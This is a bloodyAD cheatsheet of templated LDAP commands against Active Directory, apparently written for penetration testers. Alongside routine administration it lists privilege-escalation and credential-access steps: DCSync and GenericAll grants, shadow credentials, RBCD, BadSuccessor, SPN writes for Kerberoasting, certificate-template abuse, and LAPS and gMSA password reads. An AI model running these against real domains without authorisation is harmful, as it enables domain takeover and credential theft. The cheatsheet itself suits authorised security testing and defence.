# bloodyAD cheatsheet

% Active directory, bloodyAD

## Add BadSuccessor

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC

Create a DMSA (Dedicated Managed Service Account) for BadSuccessor attack.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add badSuccessor <dmsa_hostname>
```

## Add Computer

#platform/Windows #target/REMOTE #protocol/LDAP #cat/COMPUTER_MANAGEMENT

Create a new computer account in the domain.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add computer <hostname> '<password>'
```

## Add DCSync Rights

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC

Grant DCSync rights to a user (requires WriteDacl on domain).

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add dcsync <target_username>
```

## Add  re Record

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT

Add a new DNS record to Active Directory DNS.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add dnsRecord <name> <data>
```

## Add GenericAll

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC

Give full control of an object to a trustee.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add genericAll <target> <target_username>
```

## Add Group Member

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT

Add a user, computer to a group.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add groupMember <group> <member>
```

## Add RBCD

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DELEGATION

Configure Resource-Based Constrained Delegation to allow a service to impersonate users on a target.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add rbcd <target> <service>
```

## Add Shadow Credentials

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC

Add Key Credentials to a target for PKINIT authentication.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add shadowCredentials <target>
```

## Add UAC Flag

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT

Add UAC flags to a user or computer account.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add uac <target> -f <flag>
```

## Add UAC Flag Multiple flags

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT

Add UAC flags to a user or computer account Multiple flags

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add uac <target> -f <flag1> -f <flag2>
```

## Add User

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT

Create a new user in the domain.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add user <sAMAccountName> '<password>'
```

## Get Commands

## Get BloodHound Data

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

Collect BloodHound data from Active Directory.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get bloodhound
```

## Get Children

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

List child objects of a container.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get children
```

## Get DNS Dump

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

Retrieve all DNS records from Active Directory.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get dnsDump
```

## Get Group Membership

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

Retrieve all groups a user belongs to.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get membership <target>
```

## Get Object

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

Retrieve attributes for a specific object.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object <target>
```

## Get LDAP Search

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

Perform an LDAP search with custom filters.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get search
```

## Get Trusts 

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

Display domain trusts in a tree view.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get trusts
```

## Get Writable Objects

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

Find objects you have write access to.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get writable
```

## Get Writable Objects With Details

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

Find objects you have write access to with detailed attribute information.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get writable --detail
```

## Get Deleted Objects

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

Find deleted objects in Active Directory that you have write access to.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get writable --include-del
```

## Remove Commands

## Remove DCSync Rights

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC

Remove DCSync rights from a user.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove dcsync <target_username>
```

## Remove DNS Record

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT

Remove a DNS record from Active Directory DNS.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove dnsRecord <name> <data>
```

## Remove GenericAll

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC

Remove full control of a trustee on a target.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove genericAll <target> <target_username>
```

## Remove Group Member

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT

Remove a user, computer, or group from a security group.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove groupMember <group> <member>
```

## Remove Object

#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT

Delete an object from Active Directory.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove object <target>
```

## Remove RBCD

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DELEGATION

Remove Resource-Based Constrained Delegation configuration from a target.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove rbcd <target> <service>
```

## Remove Shadow Credentials

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC

Remove Key Credentials from a target.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove shadowCredentials <target>
```

## Remove UAC Flag

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT

Remove UAC flags from a user or computer account.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove uac <target> -f <flag>
```

Multiple flags:

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove uac <target> -f <flag1> -f <flag2>
```

## Set Commands

## Change attributes of an AD object

#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT

Modify attributes of an AD object.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target> <attribute> -v <value>
```

## Change the owner of an AD object

#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT

Change the owner of an AD object.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set owner <target> <owner>
```

## Change user or computer password.

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT

Change a user's or computer's password.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set password <target> '<new_password>'
```

## Restore deleted object

#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT

Restore a deleted object from the AD recycle bin.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set restore <target>
```

## Common Attribute Operations

## Modify User Principal Name (UPN)

#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT

Change a user's UPN attribute.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target_user> userPrincipalName -v '<new_upn>'
```

## Check User Principal Name (UPN)

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

Verify a user's current UPN value.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object <target_user> --attr userPrincipalName
```

## Modify Email Address

#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT

Set a user's email address.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target_user> mail -v '<email>'
```

## Modify altSecurityIdentities Attribute (ESC14B)

#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT

Modify the altSecurityIdentities attribute for certificate-based attacks.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target_user> altSecurityIdentities -v 'X509:<RFC822>email@domain.com'
```

## Write Service Principal Name (SPN)

#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT

Add an SPN to a target object for Kerberoasting.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target> servicePrincipalName -v '<service>/<hostname>'
```

## Enable a Disabled Account

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT

Enable a disabled user account by removing the ACCOUNTDISABLE flag.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove uac <target_user> -f ACCOUNTDISABLE
```

## Add Delegation Flag

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DELEGATION

Add the TRUSTED_TO_AUTH_FOR_DELEGATION flag to enable S4U2Self.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add uac <target_user> -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

## Special Queries

## Kerberoast Detection

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

Find Kerberoastable accounts.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName
```

## AS-REP Roasting Detection

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

Find accounts vulnerable to AS-REP roasting.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

## Credential Access

## LAPS Password Retrieval

#platform/Windows #target/REMOTE #protocol/LDAP #cat/CREDENTIAL_ACCESS

Read LAPS password from a computer object.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object '<computer_name>$' --attr ms-Mcs-AdmPwd
```

## GMSA Password Retrieval

#platform/Windows #target/REMOTE #protocol/LDAP #cat/CREDENTIAL_ACCESS

Read GMSA password from a managed service account.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object '<gmsa_name>$' --attr msDS-ManagedPassword
```

## Machine Account Quota Management

## Check Machine Account Quota

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION

Check the Machine Account Quota (MAQ) setting.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object '<DC=dc,DC=dc>' --attr ms-DS-MachineAccountQuota
```

## Set Machine Account Quota

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DOMAIN_MANAGEMENT

Set the Machine Account Quota (MAQ) value.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object '<DC=dc,DC=dc>' ms-DS-MachineAccountQuota -v <value>
```

## MSLDAP Commands (Experimental)

## MSLDAP add_genericwrite

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC #experimental

Add genericWrite right on a target.
target_dn: CN=target_object,CN=Users,DC=domain,DC=com
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap add_genericwrite <target_dn> <user_dn>
```

## MSLDAP addallowedtoactonbehalfofotheridentity

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DELEGATION #experimental

Add a SID to the msDS-AllowedToActOnBehalfOfOtherIdentity property.
target_dn: CN=target_object,CN=Users,DC=domain,DC=com
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addallowedtoactonbehalfofotheridentity <target_dn> <other_identity_sid>
```

## MSLDAP addcerttemplatenameflagaltname

#platform/Windows #target/REMOTE #protocol/LDAP #cat/CERTIFICATE #experimental

Modify certificate template to enable ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME bit.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addcerttemplatenameflagaltname <cert_template_name>
```

## MSLDAP addcomputer

#platform/Windows #target/REMOTE #protocol/LDAP #cat/COMPUTER_MANAGEMENT #experimental

Add a new computer account.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addcomputer
```

## MSLDAP addenrollmentright

#platform/Windows #target/REMOTE #protocol/LDAP #cat/CERTIFICATE #experimental

Grant enrollment rights to a user for a certificate template.
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addenrollmentright <cert_template_name> <user_dn>
```

## MSLDAP addhostname

#platform/Windows #target/REMOTE #protocol/LDAP #cat/COMPUTER_MANAGEMENT #experimental

Add additional hostname to a computer account.
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addhostname <user_dn> <hostname>
```

## MSLDAP addprivaddmember

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC #experimental

Add AddMember rights to a user on a group.
group_dn: CN=target_group,CN=Users,DC=domain,DC=com
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addprivaddmember <user_dn> <group_dn>
```

## MSLDAP addprivdcsync

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC #experimental

Add DCSync rights to a user.
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addprivdcsync <user_dn>
```

## MSLDAP addspn

#platform/Windows #target/REMOTE #protocol/LDAP #cat/COMPUTER_MANAGEMENT #experimental

Add an SPN entry to a user account.
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addspn <user_dn> <spn>
```

## MSLDAP adduser

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT #experimental

Create a new domain user with password.
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap adduser <user_dn> <password>
```

## MSLDAP addusertogroup

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT #experimental

Add user to a specified group.
group_dn: CN=target_group,CN=Users,DC=domain,DC=com
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addusertogroup <user_dn> <group_dn>
```

## MSLDAP adinfo

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Print detailed Active Directory info.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap adinfo
```

## MSLDAP aiacas

#platform/Windows #target/REMOTE #protocol/LDAP #cat/CERTIFICATE #experimental

List AIA CA certificates.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap aiacas
```

## MSLDAP allschemaentry

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch all schema object entry objects.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap allschemaentry
```

## MSLDAP asrep

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch ASREP-roastable user accounts.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap asrep
```

## MSLDAP badsuccessor_check

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC #experimental

Check if BadSuccessor vulnerability is present on the domain.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap badsuccessor_check
```

## MSLDAP certify

#platform/Windows #target/REMOTE #protocol/LDAP #cat/CERTIFICATE #experimental

ADCA security test.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap certify
```

## MSLDAP certify2

#platform/Windows #target/REMOTE #protocol/LDAP #cat/CERTIFICATE #experimental

ADCA security test - new version.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap certify2
```

## MSLDAP certtemplates

#platform/Windows #target/REMOTE #protocol/LDAP #cat/CERTIFICATE #experimental

List certificate templates.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap certtemplates
```

## MSLDAP changeowner

#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT #experimental

Change the owner in a Security Descriptor.
target_dn: CN=target_object,CN=Users,DC=domain,DC=com
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap changeowner <new_owner_sid> <target_dn>
```

## MSLDAP changesamaccountname

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT #experimental

Change the sAMAccountName of a given DN.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap changesamaccountname <dn> <newname>
```

## MSLDAP changeuserpw

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT #experimental

Change user password.
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap changeuserpw <user_dn> <newpass>
```

## MSLDAP computeraddr

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch all computer accounts.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap computeraddr
```

## MSLDAP constrained

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

List all constrained delegation objects.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap constrained
```

## MSLDAP create_broken_dmsa_user

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC #experimental

Create a DMSA service user for potential exploitation.
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap create_broken_dmsa_user <user_dn> <computersid>
```

## MSLDAP dadms

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

List all members of the domain administrators group.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dadms
```

## MSLDAP delete

#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT #experimental

Remove an object identified by its DN.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap delete <dn>
```

## MSLDAP delspn

#platform/Windows #target/REMOTE #protocol/LDAP #cat/COMPUTER_MANAGEMENT #experimental

Remove an SPN entry from a user account.
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap delspn <user_dn> <spn>
```

## MSLDAP deluser

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT #experimental

Delete a user.
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap deluser <user_dn>
```

## MSLDAP deluserfromgroup

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT #experimental

Remove user from a specified group.
group_dn: CN=target_group,CN=Users,DC=domain,DC=com
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap deluserfromgroup <user_dn> <group_dn>
```

## MSLDAP disableuser

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT #experimental

Disable a user account.
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap disableuser <user_dn>
```

## MSLDAP dmsaaddmanagedaccountprecededbylink

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC #experimental

Add a managed account preceded by link to a DMSA.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dmsaaddmanagedaccountprecededbylink <dn> <managedaccountprecededbylink>
```

## MSLDAP dmsas

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

List all delegated managed service accounts (DMSA).

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dmsas
```

## MSLDAP dmsasetdelegatedmsastate

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC #experimental

Set the delegated MSA state of a DMSA.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dmsasetdelegatedmsastate <dn> <delegatedmsastate>
```

## MSLDAP dn2sam

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch the sAMAccountName of an object based on the DN.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dn2sam <dn>
```

## MSLDAP dn2sid

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch the objectSid of an object based on the DN.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dn2sid <dn>
```

## MSLDAP dnsadd

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT #experimental

Add a DNS record for a given target.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsadd <target> <ip>
```

## MSLDAP dnsdelete

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT #experimental

Delete a DNS record for a given target.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsdelete <target>
```

## MSLDAP dnsdump

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Dump DNS records from Active Directory.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsdump
```

## MSLDAP dnsgetserial

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT #experimental

Get the serial number of a DNS record for a given zone.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsgetserial
```

## MSLDAP dnsmodify

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT #experimental

Modify a DNS record for a given target.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsmodify <target> <ip>
```

## MSLDAP dnsquery

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT #experimental

Query a DNS record for a given target.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsquery <target>
```

## MSLDAP dnsqueryall

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT #experimental

Query all DNS records for a given zone.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsqueryall
```

## MSLDAP dnsremove

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT #experimental

Remove a DNS record for a given target (tombstones the record).

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsremove <target> <ip>
```

## MSLDAP dnsrestore

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT #experimental

Restore a DNS record for a given target.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsrestore <target>
```

## MSLDAP dnssoa

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT #experimental

Print the SOA record of a given zone.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnssoa
```

## MSLDAP dnszones

#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT #experimental

List all DNS zones.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnszones
```

## MSLDAP dump

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch ALL user and machine accounts from the domain.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dump
```

## MSLDAP enableuser

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT #experimental

Enable a user account.
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap enableuser <user_dn>
```

## MSLDAP enrollmentservices

#platform/Windows #target/REMOTE #protocol/LDAP #cat/CERTIFICATE #experimental

List enrollment services.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap enrollmentservices
```

## MSLDAP genschema

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Generate schema data (takes a long time).

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap genschema
```

## MSLDAP getsd

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch security info for a given DN.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap getsd <dn>
```

## MSLDAP gmsa

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

List all managed service accounts (MSA) and retrieve passwords if possible.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap gmsa
```

## MSLDAP gpos

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch Group Policy Objects.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap gpos
```

## MSLDAP groupmembers

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Return all member users in a group specified by DN.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap groupmembers <dn>
```

## MSLDAP groupmembership

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch all groupnames the user is a member of for a given DN.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap groupmembership <dn>
```

## MSLDAP laps

#platform/Windows #target/REMOTE #protocol/LDAP #cat/CREDENTIAL_ACCESS #experimental

Fetch all LAPS passwords.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap laps
```

## MSLDAP lapstarget

#platform/Windows #target/REMOTE #protocol/LDAP #cat/CREDENTIAL_ACCESS #experimental

Fetch LAPS password for a specific machine.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap lapstarget <machinesid>
```

## MSLDAP ldapinfo

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Print detailed LDAP connection info (DSA).

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap ldapinfo
```

## MSLDAP machine

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch a machine object based on the sAMAccountName.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap machine <samaccountname>
```

## MSLDAP modify

#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT #experimental

Modify an attribute of object.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap modify <dn> <attribute> <value>
```

## MSLDAP ntcas

#platform/Windows #target/REMOTE #protocol/LDAP #cat/CERTIFICATE #experimental

List NT CA certificates.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap ntcas
```

## MSLDAP pre2000

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

List potentially abusable machine accounts created with pre-Windows-2000 flag.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap pre2000
```

## MSLDAP query

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Perform a raw LDAP query.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap query <query>
```

## MSLDAP rootcas

#platform/Windows #target/REMOTE #protocol/LDAP #cat/CERTIFICATE #experimental

List Root CA certificates.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap rootcas
```

## MSLDAP s4u2proxy

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

List all S4U2Proxy objects.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap s4u2proxy
```

